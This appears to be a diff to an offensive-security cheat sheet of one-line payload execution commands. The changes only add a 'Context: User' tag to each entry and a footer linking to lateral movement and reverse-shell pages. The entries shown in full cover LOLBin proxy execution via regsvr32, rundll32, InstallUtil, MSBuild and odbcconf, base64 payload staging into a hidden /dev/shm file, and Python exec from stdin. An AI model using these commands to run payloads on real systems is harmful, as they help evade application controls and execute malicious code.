@@ -10,7 +10,7 @@ One-line execution primitives for payloads or scripts already available on the t
 regsvr32.exe /s /u /i:payload.sct scrobj.dll
 ```
 
-**Tool:** regsvr32 · **Platform:** Windows · **Tags:** Scriptlet, LOLBin, Proxy Execution
+**Tool:** regsvr32 · **Platform:** Windows · **Tags:** Scriptlet, LOLBin, Proxy Execution · **Context:** User
 
 ## rundll32 DLL export
 
@@ -18,7 +18,7 @@ regsvr32.exe /s /u /i:payload.sct scrobj.dll
 rundll32.exe payload.dll,EntryPoint
 ```
 
-**Tool:** rundll32 · **Platform:** Windows · **Tags:** DLL, LOLBin, Execution
+**Tool:** rundll32 · **Platform:** Windows · **Tags:** DLL, LOLBin, Execution · **Context:** User
 
 ## InstallUtil uninstall path
 
@@ -26,7 +26,7 @@ rundll32.exe payload.dll,EntryPoint
 InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
 ```
 
-**Tool:** InstallUtil · **Platform:** Windows · **Tags:** .NET, LOLBin, Execution
+**Tool:** InstallUtil · **Platform:** Windows · **Tags:** .NET, LOLBin, Execution · **Context:** User
 
 ## MSBuild project execution
 
@@ -34,7 +34,7 @@ InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
 MSBuild.exe payload.xml
 ```
 
-**Tool:** MSBuild · **Platform:** Windows · **Tags:** MSBuild, LOLBin, Execution
+**Tool:** MSBuild · **Platform:** Windows · **Tags:** MSBuild, LOLBin, Execution · **Context:** User
 
 ## ODBCConf DLL registration
 
@@ -42,7 +42,7 @@ MSBuild.exe payload.xml
 odbcconf.exe /S /A {REGSVR payload.dll}
 ```
 
-**Tool:** odbcconf · **Platform:** Windows · **Tags:** DLL, LOLBin, Execution
+**Tool:** odbcconf · **Platform:** Windows · **Tags:** DLL, LOLBin, Execution · **Context:** User
 
 ## Decode base64 to tmpfs
 
@@ -50,7 +50,7 @@ odbcconf.exe /S /A {REGSVR payload.dll}
 printf '%s' '<BASE64>' | base64 -d > /dev/shm/.p && chmod +x /dev/shm/.p
 ```
 
-**Tool:** base64 · **Platform:** Linux · **Tags:** Decode, tmpfs, Staging
+**Tool:** base64 · **Platform:** Linux · **Tags:** Decode, tmpfs, Staging · **Context:** User
 
 ## Execute Python from stdin
 
@@ -58,4 +58,8 @@ printf '%s' '<BASE64>' | base64 -d > /dev/shm/.p && chmod +x /dev/shm/.p
 python3 -c "exec(open('/dev/stdin').read())" < payload.py
 ```
 
-**Tool:** Python · **Platform:** Linux/macOS · **Tags:** Python, stdin, Execution
+**Tool:** Python · **Platform:** Linux/macOS · **Tags:** Python, stdin, Execution · **Context:** User
+
+---
+
+**Related:** [Overview](./) · [Lateral Movement](lateral-movement.md) · [Reverse Shells](reverse-shells.md)
